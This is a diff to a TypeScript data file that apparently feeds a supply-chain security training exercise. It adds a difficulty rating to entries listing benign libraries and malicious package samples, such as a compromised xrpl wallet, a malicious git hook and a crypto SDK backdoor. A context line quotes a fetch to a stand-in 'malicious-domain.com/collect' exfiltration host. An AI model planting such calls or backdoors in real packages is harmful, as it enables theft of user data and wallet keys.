@@ -10,6 +10,7 @@ export interface CodeExample {
   weeklyDownloads: string;
   lastPublished: string;
   version: string;
+  difficulty: 'easy' | 'medium' | 'hard';
 }
 
 export const codeExamples: CodeExample[] = [
@@ -24,6 +25,7 @@ export const codeExamples: CodeExample[] = [
     weeklyDownloads: '2,450',
     lastPublished: '2024-06-18',
     version: '1.0.0',
+    difficulty: 'easy',
     code: `// polyfill-io-loader v1.0.0
 const script = document.createElement('script');
 script.src = 'https://cdn.polyfill.io/v3/polyfill.min.js';
@@ -49,6 +51,7 @@ fetch('https://malicious-domain.com/collect', {
     weeklyDownloads: '1,834',
     lastPublished: '2024-06-20',
     version: '1.1.2',
+    difficulty: 'medium',
     code: `class PolyfillPlugin {
   apply(compiler) {
     compiler.hooks.compilation.tap('Plugin', (compilation) => {
@@ -76,6 +79,7 @@ fetch('https://malicious-domain.com/collect', {
     weeklyDownloads: '982',
     lastPublished: '2024-06-19',
     version: '2.0.1',
+    difficulty: 'medium',
     code: `module.exports = function(options) {
   return {
     name: 'polyfill-runtime',
@@ -98,6 +102,7 @@ fetch('https://malicious-domain.com/collect', {
     weeklyDownloads: '15,673',
     lastPublished: '2024-03-14',
     version: '1.2.5',
+    difficulty: 'hard',
     code: `const originalRequire = require;
 require = function(module) {
   const result = originalRequire(module);
@@ -128,6 +133,7 @@ require = function(module) {
     weeklyDownloads: '45,892,103',
     lastPublished: '2018-07-12',
     version: '3.7.2',
+    difficulty: 'easy',
     code: `const https = require('https');
 const os = require('os');
 
@@ -154,6 +160,7 @@ try {
     weeklyDownloads: '58,234,567',
     lastPublished: '2021-02-20',
     version: '4.17.21',
+    difficulty: 'easy',
     code: `// lodash v4.17.21
 function chunk(array, size = 1) {
   size = Math.max(size, 0);
@@ -182,6 +189,7 @@ function chunk(array, size = 1) {
     weeklyDownloads: '45,892,341',
     lastPublished: '2024-01-15',
     version: '1.6.0',
+    difficulty: 'easy',
     code: `// axios v1.6.0
 function request(config) {
   return new Promise((resolve, reject) => {
@@ -213,6 +221,7 @@ function request(config) {
     weeklyDownloads: '26,782,456',
     lastPublished: '2023-06-16',
     version: '18.2.0',
+    difficulty: 'easy',
     code: `// react v18.2.0
 function useState(initialState) {
   const dispatcher = resolveDispatcher();
@@ -241,6 +250,7 @@ function resolveDispatcher() {
     weeklyDownloads: '39,456,289',
     lastPublished: '2022-10-08',
     version: '4.18.2',
+    difficulty: 'easy',
     code: `// express v4.18.2
 function createApplication() {
   const app = function(req, res, next) {
@@ -271,6 +281,7 @@ function createApplication() {
     weeklyDownloads: '12,345,678',
     lastPublished: '2023-09-01',
     version: '13.11.0',
+    difficulty: 'medium',
     code: `// validator v13.11.0
 function isEmail(str, options = {}) {
   const parts = str.split('@');
@@ -295,6 +306,7 @@ function isEmail(str, options = {}) {
     weeklyDownloads: '15,234,890',
     lastPublished: '2022-07-06',
     version: '2.29.4',
+    difficulty: 'medium',
     code: `// moment v2.29.4
 function createLocal(input, format, locale, strict) {
   const config = createLocalOrUTC(input, format, locale, strict, false);
@@ -319,6 +331,7 @@ function duration(input, unit) {
     weeklyDownloads: '89,456,123',
     lastPublished: '2021-05-10',
     version: '4.1.2',
+    difficulty: 'medium',
     code: `// chalk v4.1.2
 const chalk = (text) => {
   const styles = [];
@@ -345,6 +358,7 @@ const chalk = (text) => {
     weeklyDownloads: '67,892,345',
     lastPublished: '2023-11-14',
     version: '9.0.1',
+    difficulty: 'hard',
     code: `// uuid v9.0.1
 function v4(options, buf, offset) {
   const rnds = crypto.randomBytes(16);
@@ -372,6 +386,7 @@ function stringify(arr) {
     weeklyDownloads: '45,678,901',
     lastPublished: '2023-08-22',
     version: '16.3.1',
+    difficulty: 'hard',
     code: `// dotenv v16.3.1
 function config(options = {}) {
   const dotenvPath = path.resolve(process.cwd(), '.env');
@@ -401,6 +416,7 @@ function config(options = {}) {
     weeklyDownloads: '78,901,234',
     lastPublished: '2023-12-05',
     version: '11.1.0',
+    difficulty: 'hard',
     code: `// commander v11.1.0
 class Command {
   constructor(name) {
@@ -431,6 +447,7 @@ class Command {
     weeklyDownloads: '89,234',
     lastPublished: '2024-01-20',
     version: '2.9.0',
+    difficulty: 'easy',
     code: `// Compromised xrpl package
 class Wallet {
   constructor(seed) {
@@ -460,6 +477,7 @@ class Wallet {
     weeklyDownloads: '12,456',
     lastPublished: '2024-02-14',
     version: '1.0.5',
+    difficulty: 'medium',
     code: `// husky-ts malicious hook
 module.exports = {
   hooks: {
@@ -490,6 +508,7 @@ module.exports = {
     weeklyDownloads: '8,456,789',
     lastPublished: '2021-10-22',
     version: '0.7.29',
+    difficulty: 'medium',
     code: `// Compromised ua-parser-js
 const UAParser = function(ua) {
   this.parse = function() {
@@ -516,6 +535,7 @@ const UAParser = function(ua) {
     weeklyDownloads: '23,456',
     lastPublished: '2024-03-10',
     version: '1.0.2',
+    difficulty: 'easy',
     code: `// react-html2pdf backdoor
 export const Html2Pdf = ({ children }) => {
   useEffect(() => {
@@ -545,6 +565,7 @@ export const Html2Pdf = ({ children }) => {
     weeklyDownloads: '5,678',
     lastPublished: '2024-01-08',
     version: '1.1.1',
+    difficulty: 'hard',
     code: `// Typosquatting attack
 function request(url, options) {
   // Intercepts all HTTP requests
@@ -575,6 +596,7 @@ function request(url, options) {
     weeklyDownloads: '456,789',
     lastPublished: '2024-04-15',
     version: '0.5.9',
+    difficulty: 'hard',
     code: `// Compromised rspack core
 class Compiler {
   compile(callback) {
@@ -607,6 +629,7 @@ class Compiler {
     weeklyDownloads: '234,567',
     lastPublished: '2024-04-15',
     version: '0.5.9',
+    difficulty: 'hard',
     code: `// Compromised rspack CLI
 const cli = {
   run: async (args) => {
@@ -639,6 +662,7 @@ const cli = {
     weeklyDownloads: '8,901',
     lastPublished: '2024-02-20',
     version: '2.0.1',
+    difficulty: 'medium',
     code: `// country-currency-map backdoor
 const currencyMap = {
   US: 'USD',
@@ -671,6 +695,7 @@ const getCurrency = (country) => {
     weeklyDownloads: '3,456',
     lastPublished: '2024-01-30',
     version: '1.2.0',
+    difficulty: 'easy',
     code: `// Malicious BNB SDK
 class BnbClient {
   async transfer(to, amount, privateKey) {
@@ -701,6 +726,7 @@ class BnbClient {
     weeklyDownloads: '1,234',
     lastPublished: '2024-03-05',
     version: '3.1.0',
+    difficulty: 'medium',
     code: `// Malicious eslint config
 module.exports = {
   extends: ['eslint:recommended'],
@@ -734,6 +760,7 @@ module.exports = {
     weeklyDownloads: '2,345',
     lastPublished: '2024-02-28',
     version: '1.0.8',
+    difficulty: 'easy',
     code: `// Crosswise SDK malware
 export class Trade {
   async execute(wallet, token, amount) {
@@ -765,6 +792,7 @@ export class Trade {
     weeklyDownloads: '4,567',
     lastPublished: '2024-03-12',
     version: '7.2.1',
+    difficulty: 'easy',
     code: `// Malicious KeepKey protocol
 export class DeviceProtocol {
   async initialize(seed) {
@@ -796,6 +824,7 @@ export class DeviceProtocol {
     weeklyDownloads: '1,890',
     lastPublished: '2024-04-01',
     version: '0.14.2',
+    difficulty: 'medium',
     code: `// VeniceSwap UIKit backdoor
 export const ConnectButton = ({ onConnect }) => {
   const handleConnect = async (wallet) => {
@@ -824,6 +853,7 @@ export const ConnectButton = ({ onConnect }) => {
     weeklyDownloads: '987',
     lastPublished: '2024-03-20',
     version: '1.0.3',
+    difficulty: 'medium',
     code: `// eslint-config-pancake malware
 module.exports = {
   rules: {
@@ -857,6 +887,7 @@ module.exports = {
     weeklyDownloads: '5,432',
     lastPublished: '2024-04-08',
     version: '2.1.0',
+    difficulty: 'hard',
     code: `// ui-themes with tracking
 export const ThemeProvider = ({ children }) => {
   useEffect(() => {
@@ -892,6 +923,7 @@ export const ThemeProvider = ({ children }) => {
     weeklyDownloads: '3,210',
     lastPublished: '2024-02-15',
     version: '1.5.2',
+    difficulty: 'easy',
     code: `// bitcoin-cash-js-lib malware
 export class Wallet {
   fromWIF(wif) {
